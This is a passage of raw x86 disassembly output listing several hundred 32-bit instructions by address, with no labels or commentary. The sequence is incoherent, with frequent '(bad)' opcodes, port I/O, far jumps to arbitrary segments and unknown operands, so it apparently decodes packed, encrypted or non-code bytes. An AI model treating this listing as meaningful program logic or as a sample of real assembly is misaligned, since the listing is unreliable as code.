  4041b5:	pop    ds
  4041b6:	lods   al,BYTE PTR ds:[esi]
  4041b7:	or     BYTE PTR [esi+edi*2-0x74f66741],dl
  4041be:	test   DWORD PTR [esi+0x134a3597],ebp
  4041c4:	cmp    eax,ecx
  4041c6:	(bad)  
  4041c7:	mov    dl,0xac
  4041c9:	fcomp  DWORD PTR [ecx-0x72]
  4041cc:	bound  esi,QWORD PTR [edx+esi*8+0x4f1a1767]
  4041d3:	jg     0x404170
  4041d5:	std    
  4041d6:	and    ecx,DWORD PTR [esi-0x40540d11]
  4041dc:	pop    ss
  4041dd:	mov    ecx,0x1c1a386a
  4041e2:	adc    BYTE PTR [edx-0x78],cl
  4041e5:	call   FWORD PTR [edi+esi*4+0x3d42e74b]
  4041ec:	jecxz  0x404197
  4041ee:	sub    ebp,esi
  4041f0:	sahf   
  4041f1:	mov    ds:0x5afdadcb,al
  4041f6:	and    DWORD PTR [eax+0x3],ecx
  4041f9:	xor    ah,dl
  4041fb:	xchg   edi,eax
  4041fc:	push   esi
  4041fd:	sbb    eax,0x1f3bd5c0
  404202:	or     al,0x6e
  404204:	jmp    0x404229
  404206:	mov    esp,0xe7c588c1
  40420b:	in     al,0xbc
  40420d:	fs fs lahf 
  404210:	sti    
  404211:	popa   
  404212:	ja     0x40420c
  404214:	je     0x404263
  404216:	cdq    
  404217:	in     eax,dx
  404218:	div    DWORD PTR [ecx]
  40421a:	lods   al,BYTE PTR ds:[esi]
  40421b:	lds    ebx,FWORD PTR [ebp+0x48]
  40421e:	pusha  
  40421f:	adc    esi,DWORD PTR [esi]
  404221:	mov    cs,WORD PTR [ebp+0x63]
  404224:	inc    esi
  404225:	adc    al,0x3d
  404227:	xor    ebp,DWORD PTR [esi-0x6]
  40422a:	out    0x21,al
  40422c:	fld    TBYTE PTR [ecx-0x6d7809e2]
  404232:	imul   ebx,DWORD PTR [ebp+0x42026ce4],0x61f1b19d
  40423c:	(bad)
  404240:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404241:	outs   dx,BYTE PTR ds:[esi]
  404242:	ja     0x404231
  404244:	cld    
  404245:	es inc esi
  404247:	clc    
  404248:	out    dx,al
  404249:	call   0x543:0xc3e01e0d
  404250:	sub    al,0x8
  404252:	mov    ?,edi
  404254:	out    dx,eax
  404255:	push   esi
  404256:	nop
  404257:	or     eax,0x9ac9d02e
  40425c:	out    dx,al
  40425d:	test   al,0x3d
  40425f:	add    al,0xa8
  404261:	xchg   ebx,eax
  404262:	push   es
  404263:	xor    DWORD PTR [ecx+0x45],edi
  404266:	shr    ecx,cl
  404268:	repz std 
  40426a:	push   cs
  40426b:	loop   0x4042b7
  40426d:	or     eax,0x69ebb0da
  404272:	fs mov bl,cl
  404275:	fnstenv [esi+0x31]
  404278:	cmp    ecx,DWORD PTR [eax+0x6a]
  40427b:	jp     0x404260
  40427d:	mov    ds:0xe6cce48c,eax
  404282:	aad    0x2f
  404284:	push   0xdd325b47
  404289:	retf   
  40428a:	lds    edi,FWORD PTR [esi-0x43]
  40428d:	pop    ss
  40428e:	mov    ebp,0x8c86e24
  404293:	sub    dl,BYTE PTR [ebx+0x6768e07b]
  404299:	and    dh,BYTE PTR [edx]
  40429b:	jbe    0x4042e0
  40429d:	int3   
  40429e:	js     0x404280
  4042a0:	loopne 0x4042f4
  4042a2:	dec    esi
  4042a3:	pop    edx
  4042a4:	ror    DWORD PTR [esi-0xf],0x9d
  4042a8:	push   esp
  4042a9:	xchg   BYTE PTR [ebp+ecx*2-0x54],dl
  4042ad:	mov    edx,0x89778afc
  4042b2:	mov    eax,ebp
  4042b4:	jne    0x4042ec
  4042b6:	sbb    edi,DWORD PTR [ebp-0x7680f7dc]
  4042bc:	and    dh,BYTE PTR [ebx+edi*8]
  4042bf:	setne  BYTE PTR [eax-0x64cd7d42]
  4042c6:	sbb    edx,ecx
  4042c8:	xchg   ebp,eax
  4042c9:	jnp    0x4042a2
  4042cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042cc:	mov    WORD PTR [ebx+0x2e],?
  4042cf:	dec    ebp
  4042d0:	mov    esp,0xa9d968cf
  4042d5:	push   ss
  4042d6:	test   BYTE PTR [ecx+0x71],al
  4042d9:	inc    esi
  4042da:	shl    BYTE PTR [esi-0x270a5bd0],1
  4042e0:	loopne 0x4042a9
  4042e2:	fldl2e 
  4042e4:	in     al,0xe4
  4042e6:	xchg   esp,eax
  4042e7:	mov    al,0x97
  4042e9:	jns    0x404308
  4042eb:	xchg   ebp,eax
  4042ec:	mov    DWORD PTR [edi+0x3e],ebx
  4042ef:	lods   al,BYTE PTR ds:[esi]
  4042f0:	es sub eax,0x263e697c
  4042f6:	adc    edx,esi
  4042f8:	fadd   QWORD PTR [esi+ecx*1]
  4042fb:	fucomp st(6)
  4042fd:	mov    WORD PTR [edx],?
  4042ff:	iret   
  404300:	xchg   ebp,eax
  404301:	std    
  404302:	mov    ds:0x51e1e3f1,al
  404307:	pop    edx
  404308:	lods   eax,DWORD PTR ds:[esi]
  404309:	fild   DWORD PTR [eax]
  40430b:	out    dx,al
  40430c:	(bad)  
  40430d:	js     0x4042ab
  40430f:	sbb    DWORD PTR [edx+0x2b],esp
  404312:	and    BYTE PTR [esi-0x1e],dl
  404315:	sbb    DWORD PTR [ebx+0x3fbc539c],ecx
  40431b:	je     0x404323
  40431d:	sub    eax,0x70237758
  404322:	(bad)  
  404325:	push   0x2d715335
  40432a:	aas    
  40432b:	mov    dl,0xc5
  40432d:	retf   
  40432e:	pop    es
  40432f:	out    dx,al
  404330:	add    ah,BYTE PTR [ecx]
  404332:	loop   0x40434d
  404334:	lock (bad) 
  404337:	sbb    ebx,ebx
  404339:	jnp    0x40439c
  40433b:	xor    eax,edi
  40433d:	fcomp  QWORD PTR [ecx]
  40433f:	sbb    eax,0xf333c161
  404344:	xor    BYTE PTR [edx+ecx*2-0x7860ac3d],0x8f
  40434c:	enter  0x6514,0x4d
  404350:	into   
  404351:	inc    edx
  404352:	lock ins DWORD PTR es:[edi],dx
  404354:	push   eax
  404355:	sub    DWORD PTR [esi-0x2f],ecx
  404358:	mov    DWORD PTR [edx],edx
  40435a:	test   ebx,ebx
  40435c:	jnp    0x404308
  40435e:	inc    eax
  40435f:	cmp    dh,BYTE PTR [esi-0x7002a7d]
  404365:	sbb    esi,edx
  404367:	in     al,dx
  404368:	mov    BYTE PTR ds:[ebp-0x2a],bl
  40436c:	and    al,BYTE PTR [ebx]
  40436e:	push   ebp
  40436f:	fbld   TBYTE PTR [edi-0x7a8bf7a6]
  404375:	or     eax,0xbf4e33c0
  40437a:	outs   dx,DWORD PTR ds:[esi]
  40437b:	and    ah,BYTE PTR [ebp+edx*2-0x54151331]
  404382:	add    BYTE PTR [ebx],ch
  404384:	mov    cl,BYTE PTR [esi-0x124dd7d0]
  40438a:	outs   dx,DWORD PTR ds:[esi]
  40438b:	icebp  
  40438c:	aaa    
  40438d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40438e:	loopne 0x40432d
  404390:	stos   DWORD PTR es:[edi],eax
  404391:	inc    esp
  404392:	mov    ds:0xd247d423,al
  404397:	mov    ebx,0xe00a1743
  40439c:	add    dl,dh
  40439e:	not    DWORD PTR ds:0x351ea6ab
  4043a4:	sbb    dl,BYTE PTR [ebp-0x21]
  4043a7:	popf   
  4043a8:	cmp    DWORD PTR [eax-0x7d],esi
  4043ab:	mov    edi,0x1933e8e7
  4043b0:	sub    ah,BYTE PTR [ebx]
  4043b2:	shl    BYTE PTR [ecx],cl
  4043b4:	pop    esp
  4043b5:	sbb    BYTE PTR [edx+0x7e],dh
  4043b8:	imul   eax,ebp,0x1a872eb9
  4043be:	xor    al,0xe3
  4043c0:	adc    cl,BYTE PTR [edx]
  4043c2:	(bad)  
  4043c3:	test   BYTE PTR [ecx-0x42],0x8d
  4043c7:	je     0x404434
  4043c9:	dec    edx
  4043ca:	xchg   ecx,eax
  4043cb:	test   DWORD PTR [ebx-0x16],esi
  4043ce:	cmp    al,0xb0
  4043d0:	push   ebp
  4043d1:	pop    edx
  4043d2:	dec    ecx
  4043d3:	cmc    
  4043d4:	gs mov edi,0xcf2d0583
  4043da:	fincstp 
  4043dc:	inc    ebp
  4043dd:	jge    0x40443f
  4043df:	sahf   
  4043e0:	or     eax,0xc67a4ada
  4043e5:	xchg   esi,eax
  4043e6:	js     0x40436a
  4043e8:	mov    edx,0x558b35b
  4043ed:	xchg   edi,eax
  4043ee:	stos   BYTE PTR es:[edi],al
  4043ef:	add    al,0xa7
  4043f1:	lahf   
  4043f2:	rol    DWORD PTR [eax],1
  4043f4:	jmp    DWORD PTR [ebp+0x2]
  4043f7:	sbb    eax,0xdbb815c7
  4043fc:	stos   BYTE PTR es:[edi],al
  4043fd:	sub    eax,0xce51d7c4
  404402:	out    dx,eax
  404403:	mov    eax,0xb6e4a0a1
  404408:	mov    WORD PTR cs:[eax],?
  40440b:	mov    dl,0x9d
  40440d:	std    
  40440e:	in     al,dx
  40440f:	int    0xac
  404411:	dec    esi
  404412:	jbe    0x4043a8
  404414:	jnp    0x4043f9
  404416:	fsubr  DWORD PTR [ebx-0x3f8867cf]
  40441c:	xchg   ebx,eax
  40441d:	test   DWORD PTR [edi+0x42b36bb9],ebp
  404423:	xor    al,0x6d
  404425:	leave  
  404426:	repz aad 0x4f
  404429:	jnp    0x4043c2
  40442b:	out    0xe3,al
  40442d:	pop    es
  40442e:	add    ecx,edi
  404430:	pop    es
  404431:	xchg   ebp,eax
  404432:	les    ebp,FWORD PTR ds:0x9e5dda7c
  404438:	ret    0xa628
  40443b:	fidiv  DWORD PTR [edx+ebp*4+0x29]
  40443f:	pop    ecx
  404440:	add    cl,al
  404442:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404443:	fs ja  0x40447f
  404446:	mov    dl,BYTE PTR [eax]
  404448:	icebp  
  404449:	jo     0x404437
  40444b:	mov    dh,0x7d
  40444d:	dec    ebp
  40444e:	xor    DWORD PTR [edx-0x45d74d8d],ebx
  404454:	or     DWORD PTR [ebp+0xd76a9e0],ecx
  40445a:	add    al,0x1
  40445c:	jecxz  0x40441e
  40445e:	ds inc ebp
  404460:	pop    es
  404461:	inc    ebx
  404462:	enter  0x5fb0,0xa4
  404466:	popa   
  404467:	lahf   
  404468:	jae    0x4043f5
  40446a:	mov    cl,0x7b
  40446c:	cli    
  40446d:	ret    0xb506
  404470:	adc    edx,edi
  404472:	push   ebp
  404473:	ret    
  404474:	std    
  404475:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404476:	repz and eax,ecx
  404479:	sbb    dl,BYTE PTR [edi-0x5b19de6b]
  40447f:	fld    DWORD PTR [edi-0x11f6dd6f]
  404485:	test   eax,0xdc3322ca
  40448a:	adc    BYTE PTR [esi],bh
  40448c:	xchg   DWORD PTR [ebx+0x7af21e89],esi
  404492:	push   edi
  404493:	xchg   ebx,eax
  404494:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  404496:	js     0x404452
  404498:	fwait
  404499:	jmp    0x3046:0x26a2e672
  4044a0:	(bad)  
  4044a1:	mov    eax,ds:0x85054a4d
  4044a6:	imul   ecx,DWORD PTR fs:0x9d3a4713,0xe728e79e
  4044b1:	add    BYTE PTR [eax-0x31],bl
  4044b4:	xchg   esp,eax
  4044b5:	test   eax,0x856fa1d8
  4044ba:	clc    
  4044bb:	sahf   
  4044bc:	cmc    
  4044bd:	fs cmp DWORD PTR cs:[edx],ecx
  4044c1:	das    
  4044c2:	loopne 0x40447d
  4044c4:	test   al,0x2b
  4044c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044c7:	js     0x4044e4
  4044c9:	scas   eax,DWORD PTR es:[edi]
  4044ca:	std    
  4044cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044cc:	popf   
  4044cd:	and    WORD PTR [edi+0x58],si
  4044d1:	retf   0xe683
  4044d4:	jle    0x4044f9
  4044d6:	mov    eax,0xdf654b11
  4044db:	jg     0x40448f
  4044dd:	xlat   BYTE PTR ds:[ebx]
  4044de:	mov    WORD PTR [edx],?
  4044e0:	aas    
  4044e1:	arpl   WORD PTR [edi+0x34],di
  4044e4:	das    
  4044e5:	jp     0x404541
  4044e7:	repz mov esp,0xabee4aac
  4044ed:	push   esi
  4044ee:	clc    
  4044ef:	add    esi,DWORD PTR [ebx]
  4044f1:	repnz xchg si,ax
  4044f4:	pop    es
  4044f5:	or     BYTE PTR [ecx-0x5c],cl
  4044f8:	int3   
  4044f9:	sub    esi,DWORD PTR [ebp+edi*1+0x55]
  4044fd:	int3   
  4044fe:	adc    eax,0x826d4b8
  404503:	push   ss
  404504:	pop    eax
  404505:	sar    BYTE PTR [eax-0x15915f60],1
  40450b:	push   ds
  40450c:	sub    eax,esi
  40450e:	clc    
  40450f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404510:	and    DWORD PTR [esi],esp
  404512:	cmp    ebx,ebx
  404514:	dec    eax
  404515:	add    eax,0x17c8c262
  40451a:	mov    dl,0xd5
  40451c:	xor    BYTE PTR [ecx+0x547d831],dl
  404522:	jecxz  0x404592
  404524:	pop    ss
  404525:	cmp    bh,BYTE PTR [ebx]
  404527:	loop   0x4044b9
  404529:	clc    
  40452a:	sub    al,0x2a
  40452c:	mov    ch,0x55
  40452e:	cmp    al,0x1a
  404530:	and    eax,0x8e285ac6
  404535:	jne    0x404568
  404537:	in     al,0x7a
  404539:	mov    edi,0x9a56edb9
  40453e:	in     eax,dx
  40453f:	daa    
  404540:	sbb    DWORD PTR [edi+0x67d910d8],ebx
  404546:	fisubr DWORD PTR [esi]
  404548:	fsub   QWORD PTR cs:[esi]
  40454b:	and    al,0xd0
  40454d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40454e:	xchg   ebp,eax
  40454f:	push   ebp
  404550:	and    DWORD PTR [eax+eax*8-0x1c48e96d],0xffffffb7
  404558:	jb     0x40455c
  40455a:	data16 fwait
  40455c:	shr    dl,1
  40455e:	jno    0x4045d8
  404560:	nop
  404561:	shl    edi,0x21
  404564:	in     eax,dx
  404565:	mov    DWORD PTR [ecx+eax*1],eax
  404568:	repnz pusha 
  40456a:	js     0x404513
  40456c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40456d:	(bad)  
  40456e:	rol    bh,cl
  404570:	mov    edi,0x7ec09554
  404575:	pop    ebp
  404576:	leave  
  404577:	mov    al,0xf2
  404579:	push   ss
  40457a:	mov    al,ds:0xc40a2767
  40457f:	mov    ebx,0x925c97cf
  404584:	adc    dh,dh
  404586:	and    bh,BYTE PTR [esi+0x42a2bda1]
  40458c:	jmp    0xb722:0x45e3ef23
  404593:	push   0x8519bf87
  404598:	cmp    edx,esi
  40459a:	sub    eax,0xdd839fe
  40459f:	stos   DWORD PTR es:[edi],eax
  4045a0:	sbb    BYTE PTR [edx-0x3338f83e],dl
  4045a6:	sbb    esp,DWORD PTR [eax]
  4045a8:	pop    ds
  4045a9:	pop    eax
  4045aa:	mov    ds:0x4d91c546,eax
  4045af:	or     al,BYTE PTR [ebp-0x51dd14ec]
  4045b5:	cli    
  4045b6:	adc    eax,0xcce8c0e2
  4045bb:	mov    DWORD PTR [esi],ebp
  4045bd:	xor    di,bp
  4045c0:	pushf  
  4045c1:	xchg   ebp,eax
  4045c2:	add    al,0x1a
  4045c4:	mov    dl,0x5c
  4045c6:	fs cs xchg ebp,eax
  4045c9:	inc    esp
  4045ca:	mov    esi,0x653b64c0
  4045cf:	adc    ah,BYTE PTR [edx-0x4af96bde]
  4045d5:	loope  0x4045b2
  4045d7:	or     al,cl
  4045d9:	sub    bl,BYTE PTR ss:[esi+0x28b530d3]
  4045e0:	adc    eax,0x6e1f9cfa
  4045e5:	mov    ch,0xa3
  4045e7:	mov    ds:0x9b63a447,eax
  4045ec:	add    BYTE PTR [edi-0x6b],dh
  4045ef:	scas   al,BYTE PTR es:[edi]
  4045f0:	sub    BYTE PTR [eax+0x57],bl
  4045f3:	mov    BYTE PTR [edi+0xa6eadf7],bh
  4045f9:	enter  0xa723,0x75
  4045fd:	mov    al,0x8
  4045ff:	sub    DWORD PTR [edx+0x16],ebx
  404602:	mov    cl,0x50
  404604:	inc    ebp
  404605:	cmp    DWORD PTR [edi+0x15d2b9b3],0xa488ef47
  40460f:	add    dl,bl
  404611:	call   0x882a:0x2e3de2aa
  404618:	jle    0x404647
  40461a:	pop    ebx
  40461b:	rcr    DWORD PTR [eax-0x2ee963e2],cl
  404621:	xchg   ecx,eax
  404622:	loopne 0x4045d6
  404624:	jnp    0x404670
  404626:	mov    ch,0x7d
  404628:	not    bl
  40462a:	dec    ecx
  40462b:	lock out dx,eax
  40462d:	and    bh,dl
  40462f:	adc    cl,BYTE PTR [edx]
  404631:	out    0xef,al
  404633:	out    0x1,al
  404635:	mov    ebp,0x16d2591a
  40463a:	xor    eax,0xeda35b6f
  40463f:	stos   BYTE PTR es:[edi],al
  404640:	hlt    
  404641:	jge    0x4045e0
  404643:	outs   dx,BYTE PTR ds:[esi]
  404644:	or     DWORD PTR [edx+0x4ebacca2],ebx
  40464a:	sub    ah,ch
  40464c:	xchg   esp,eax
  40464d:	dec    ebp
  40464e:	int    0x41
  404650:	jmp    0x7823967
  404655:	sbb    al,0xf9
  404657:	out    dx,al
  404658:	mov    edi,0x52ebe6ec
  40465d:	sub    DWORD PTR [edx+0x2d],eax
  404660:	pop    es
  404661:	outs   dx,DWORD PTR ds:[esi]
  404662:	xchg   ebp,eax
  404663:	cwde   
  404664:	xor    BYTE PTR [esi-0x3044a8e4],bl
  40466a:	out    dx,al
  40466b:	(bad)  
  40466c:	pop    ebp
  40466d:	lock or ah,al
  404670:	push   es
  404671:	sub    al,0xca
  404673:	adc    cl,bh
  404675:	adc    ch,BYTE PTR [ebp-0xec30f26]
  40467b:	call   0x4463edc5
  404680:	jmp    FWORD PTR [ecx]
  404682:	jle    0x404667
  404684:	in     eax,dx
  404685:	popf   
  404686:	(bad)  
  404687:	and    ah,BYTE PTR [ecx+0x6e]
  40468a:	push   edi
  40468b:	les    edi,FWORD PTR [eax+edx*1-0x6ad4976e]
  404692:	xchg   ecx,eax
  404693:	data16 jle 0x4046f4
  404696:	pushf  
  404697:	lea    ebp,[edi+0xfa462c3]
  40469d:	push   esi
  40469e:	sub    esp,esp
  4046a0:	pop    ss
  4046a1:	sub    eax,0x93e26d26
  4046a6:	add    DWORD PTR [eax],esp
  4046a8:	pop    ds
  4046a9:	stos   BYTE PTR es:[edi],al
  4046aa:	retf   0xb803
  4046ad:	inc    ecx
  4046ae:	jle    0x4046c7
  4046b0:	aam    0x86
  4046b2:	hlt    
  4046b3:	inc    ebp
  4046b4:	imul   edi,DWORD PTR [edi+ebx*2-0x7bdfe9fb],0x6a
  4046bc:	fld    QWORD PTR [edx]
  4046be:	cmp    cl,bh
  4046c0:	loope  0x4046b4
  4046c2:	aaa    
  4046c3:	jo     0x4046c4
  4046c5:	not    BYTE PTR [edx+0x6f]
  4046c8:	mov    DWORD PTR [edx+0x42],ebp
  4046cb:	cmp    DWORD PTR [ecx-0x76850a53],ecx
  4046d1:	(bad)  
  4046d2:	test   BYTE PTR [eax+esi*8],0x5
  4046d6:	sbb    BYTE PTR [edx-0x504e26dd],ch
  4046dc:	adc    eax,0x310f55be
  4046e1:	add    al,0xbd
  4046e3:	inc    esi
  4046e4:	adc    al,0x95
  4046e6:	mov    ebp,0x4bea9f74
  4046eb:	sbb    al,0xa7
  4046ed:	mov    eax,0xbd90d54b
  4046f2:	jmp    0x7d7:0x8d39c534
  4046f9:	dec    edi
  4046fa:	sub    eax,0x535a2ccb
  4046ff:	adc    BYTE PTR [ebp-0x479849b],al
  404705:	push   es
  404706:	in     al,0x74
  404708:	sahf   
  404709:	shl    DWORD PTR [eax],1
  40470b:	scas   eax,DWORD PTR es:[edi]
  40470c:	stos   DWORD PTR es:[edi],eax
  40470d:	jb     0x4046d9
  40470f:	and    DWORD PTR [esi-0x17d4928c],edi
  404715:	scas   eax,DWORD PTR es:[edi]
  404716:	ret    0x897b
  404719:	mov    ds:0x92ad78d8,al
  40471e:	jp     0x404786
  404720:	xchg   esi,eax
  404721:	sub    esi,ecx
  404723:	and    ch,cl
  404725:	add    ch,BYTE PTR [ecx+0x5e]
  404728:	cwde   
  404729:	inc    ebp
  40472a:	(bad)  
  40472b:	cli    
  40472c:	daa    
  40472d:	or     DWORD PTR [esi+0x60],ecx
  404730:	rep outs dx,DWORD PTR ds:[esi]
  404732:	push   ecx
  404733:	mov    edi,0xee00b6c8
  404738:	push   eax
  404739:	mov    cl,0xc8
  40473b:	adc    al,0x3f
  40473d:	xchg   ecx,eax
  40473e:	gs xor eax,0xb23ac38a
  404744:	(bad)  
  404746:	inc    ecx
  404747:	or     BYTE PTR [eax],bh
  404749:	std    
  40474a:	dec    esi
  40474b:	fisttp WORD PTR [edx+0x78]
  40474e:	call   0xb89f:0x66ab4080
  404755:	push   0x69
  404757:	out    0x52,al
  404759:	(bad)  
  40475a:	xor    eax,0x237ecb2b
  40475f:	in     al,0xc7
  404761:	mov    ebp,DWORD PTR [ebp-0x67da1844]
  404767:	std    
  404768:	scas   eax,DWORD PTR es:[edi]
  404769:	or     esi,esp
  40476b:	in     al,0x33
  40476d:	(bad)  
  40476e:	xor    edi,DWORD PTR [edi-0x66]
  404771:	jg     0x40473c
  404773:	cs jae 0x404784
  404776:	push   ds
  404777:	pop    edi
  404778:	cmc    
  404779:	or     DWORD PTR [eax-0x229aab65],0x77
  404780:	or     ch,BYTE PTR [esi]
  404782:	push   edi
  404783:	mov    ecx,DWORD PTR [eax-0x567fb8ea]
  404789:	sub    DWORD PTR [esi+0x2e],eax
  40478c:	mov    ds:0xf95d400a,eax
  404791:	inc    esi
  404792:	in     eax,0xaf
  404794:	xlat   BYTE PTR ds:[ebx]
  404795:	frstor [ebx+0x11]
  404798:	cmp    BYTE PTR [edi+0x2],bh
  40479b:	cmp    edi,DWORD PTR [eax]
  40479d:	fldcw  WORD PTR [esi-0x9]
  4047a0:	jb     0x40472b
  4047a2:	sti    
  4047a3:	rol    BYTE PTR [ebp-0x35b66d91],cl
  4047a9:	mov    ?,ebx
  4047ab:	xchg   esi,eax
  4047ac:	mov    ds:0x7a2ad878,eax
  4047b1:	lock jecxz 0x404820
  4047b4:	or     BYTE PTR [ecx-0x58],0x38
  4047b8:	push   edx
  4047b9:	mov    ebx,0x924b5f65
  4047be:	cmp    BYTE PTR ds:0x68fa9669,cl
  4047c4:	jmp    0x404845
  4047c6:	xchg   ebx,eax
  4047c7:	bound  esp,QWORD PTR es:[ebx-0x33380f39]
  4047ce:	inc    edi
  4047cf:	stc    
  4047d0:	add    DWORD PTR [edx],esi
  4047d2:	sar    edx,1
  4047d4:	(bad)  [ecx-0x7fabe632]
  4047da:	clc    
  4047db:	and    bh,BYTE PTR [edx-0x38]
  4047de:	push   ecx
  4047df:	pop    es
  4047e0:	sbb    BYTE PTR [edi+0x3b],0x50
  4047e4:	sbb    DWORD PTR [ebx],ebx
  4047e6:	stos   BYTE PTR es:[edi],al
  4047e7:	inc    ecx
  4047e8:	call   0x8e3e:0x3ba814e9
  4047ef:	push   ecx
  4047f0:	inc    ebp
  4047f1:	pop    ss
  4047f2:	out    dx,al
  4047f3:	rol    DWORD PTR [eax+0x5b],1
  4047f6:	retf   
  4047f7:	ja     0x4047db
  4047f9:	xlat   BYTE PTR ds:[ebx]
  4047fa:	mov    al,0xf3
  4047fc:	pop    eax
  4047fd:	sub    ah,BYTE PTR [edx]
  4047ff:	add    BYTE PTR [ebp+ecx*4-0x5dc84f3c],dh
  404806:	push   edx
  404807:	int3   
  404808:	mov    WORD PTR [eax],ds
  40480a:	dec    esi
  40480b:	out    0x39,eax
  40480d:	xor    al,BYTE PTR [ebx+0x2f]
  404810:	(bad)  
  404811:	mov    ch,0x38
  404813:	inc    ebx
  404814:	sti    
  404815:	dec    ebx
  404816:	call   0x556d:0xa454ffdb
  40481d:	xor    eax,DWORD PTR es:[edx-0xd]
  404821:	inc    esp
  404822:	ins    BYTE PTR es:[edi],dx
  404823:	ja     0x40488a
  404825:	loope  0x4047e4
  404827:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404828:	cs popa 
  40482a:	adc    BYTE PTR [ecx-0x81a0c52],ah
  404830:	mov    esi,0x8a3fe71c
  404835:	mov    ah,0xf3
  404837:	cmp    eax,0x8a37e9c9
  40483c:	es xor cl,dh
  40483f:	stos   DWORD PTR es:[edi],eax
  404840:	gs jmp 0xcb3:0x1e9bb8de
  404848:	or     eax,0x27b57105
  40484d:	add    eax,0x62059ea7
  404852:	inc    edx
  404853:	fwait
  404854:	dec    ecx
  404855:	push   ebx
  404856:	push   esp
  404857:	mov    dl,ah
  404859:	jne    0x4048d1
  40485b:	and    BYTE PTR [esp+edx*2+0x763e6a9c],bh
  404862:	lods   eax,DWORD PTR ds:[esi]
  404863:	fdivrp st(1),st
  404865:	fmul   DWORD PTR [eax+0x303bdd91]
  40486b:	mov    ecx,DWORD PTR [esp+eax*4+0x14]
  40486f:	test   BYTE PTR [ecx-0x3b95c8eb],bh
  404875:	or     bh,BYTE PTR [esi+0x17a6f479]
  40487b:	add    ebp,DWORD PTR ds:0x7a37d9e4
  404881:	cmp    DWORD PTR [edx-0x3b316e5f],0x50
  404888:	stos   BYTE PTR es:[edi],al
  404889:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40488a:	pop    ecx
  40488b:	test   al,0xa5
  40488d:	call   DWORD PTR [edi+eiz*8-0x76]
  404891:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404892:	sbb    al,0x5
  404894:	aam    0x1f
  404896:	aad    0x1b
  404898:	sub    al,cl
  40489a:	rol    ah,cl
  40489c:	rol    DWORD PTR [edi],0x15
  40489f:	aam    0xe7
  4048a1:	sar    edx,0x98
  4048a4:	cld    
  4048a5:	push   edx
  4048a6:	mov    ds:0xd0e1f1f8,eax
  4048ab:	inc    edi
  4048ac:	out    0x34,eax
  4048ae:	inc    ecx
  4048af:	bound  eax,QWORD PTR [edi]
  4048b1:	push   esp
  4048b2:	add    al,0x1
  4048b4:	mov    ebp,0x6f42b1c2
  4048b9:	ficom  DWORD PTR [edi]
  4048bb:	jle    0x404936
  4048bd:	and    ah,0x51
  4048c0:	repz mov ds:0xc521b735,eax
  4048c6:	je     0x4048f3
  4048c8:	scas   al,BYTE PTR es:[edi]
  4048c9:	mov    cl,0xd7
  4048cb:	mov    ah,0xa
  4048cd:	mov    BYTE PTR [edx-0x572037bd],dl
  4048d3:	mov    ch,0x14
  4048d5:	and    al,0x37
  4048d7:	jb     0x404935
  4048d9:	mov    cs,WORD PTR [edi+0x3b2c050c]
  4048df:	aaa    
  4048e0:	mov    edx,0xdac2b168
  4048e5:	dec    edx
  4048e6:	fld    st(0)
  4048e8:	mov    eax,0xd9003a60
  4048ed:	and    dl,BYTE PTR [esi]
  4048ef:	popf   
  4048f0:	shl    DWORD PTR [ecx-0x68],cl
  4048f3:	dec    esp
  4048f4:	imul   ebp,DWORD PTR [ebp+0x58],0xffffffcf
  4048f8:	std    
  4048f9:	mov    esp,0x4ace5455
  4048fe:	bound  eax,QWORD PTR es:[esi+0x6c]
  404902:	icebp  
  404903:	in     eax,0xec
  404905:	in     eax,dx
  404906:	add    edi,0xf97411c
  40490c:	inc    esp
  40490d:	cmc    
  40490e:	test   eax,0x43161c36
  404914:	push   eax
  404915:	ins    DWORD PTR es:[edi],dx
  404916:	sahf   
  404917:	lahf   
  404918:	into   
  404919:	cmp    DWORD PTR [ebx-0x3f91a3fb],eax
  40491f:	jp     0x4048c4
  404921:	and    edx,DWORD PTR [edx+edx*2-0x41]
  404925:	popa   
  404926:	(bad)  
  404927:	retf   
  404928:	outs   dx,DWORD PTR ds:[esi]
  404929:	xlat   BYTE PTR ds:[ebx]
  40492a:	ja     0x4048e7
  40492c:	jo     0x4048d0
  40492e:	mov    es,ebx
  404930:	and    al,0x45
  404932:	fdivr  DWORD PTR [ecx+0x3c]
  404935:	dec    edi
  404936:	push   esi
  404937:	mov    ah,0xd7
  404939:	jno    0x4048c8
  40493b:	mov    edx,0xf5849b55
  404940:	out    dx,al
  404941:	jbe    0x404928
  404943:	das    
  404944:	mov    edi,0x43bb033f
  404949:	js     0x404932
  40494b:	daa    
  40494c:	mov    bl,0x3e
  40494e:	push   ecx
  40494f:	xchg   ebp,edx
  404951:	sar    DWORD PTR [ebp-0x46],cl
  404954:	inc    edi
  404955:	jns    0x404932
  404957:	sbb    dl,bh
  404959:	jbe    0x4049b9
  40495b:	sti    
  40495c:	lods   eax,DWORD PTR ds:[esi]
  40495d:	and    al,0x3e
  40495f:	push   esp
  404960:	int3   
  404961:	xor    dl,BYTE PTR [edi+0x65337a9d]
  404967:	or     dl,bl
  404969:	cmc    
  40496a:	call   0x5b04978c
  40496f:	dec    ebp
  404970:	loope  0x4049b8
  404972:	inc    edi
  404973:	add    al,0xbc
  404975:	mov    ebp,DWORD PTR [esi]
  404977:	test   BYTE PTR [ebp+ebx*1+0x7],ah
  40497b:	scas   al,BYTE PTR es:[edi]
  40497c:	outs   dx,DWORD PTR ds:[esi]
  40497d:	retf   0x492a
  404980:	push   edi
  404981:	and    eax,0x9cce4234
  404986:	stc    
  404987:	cmp    eax,0x2fa3f8aa
  40498c:	push   edx
  40498d:	sbb    dh,BYTE PTR [esi+0x551a332e]
  404993:	and    al,0xbe
  404995:	mov    ah,0x69
  404997:	rcr    edx,0x3b
  40499a:	jmp    0x5444:0x8031818c
  4049a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
